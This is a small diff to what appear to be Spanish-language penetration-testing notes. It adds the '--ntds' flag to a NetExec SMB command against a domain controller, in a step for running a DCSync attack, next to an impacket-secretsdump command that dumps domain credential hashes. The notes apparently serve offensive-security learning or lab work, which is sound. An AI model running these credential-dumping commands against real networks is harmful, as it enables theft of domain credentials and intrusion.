@@ -43,7 +43,7 @@ NOTA:
 ```bash 
 Paso 3:
 # Ejecutar un DCSync 
-❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' 
+❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' --ntds
 ❯ impacket-secretsdump 'domain.local/user:P@$$w0rd123!'@IP-DC 
 
 Paso 4:
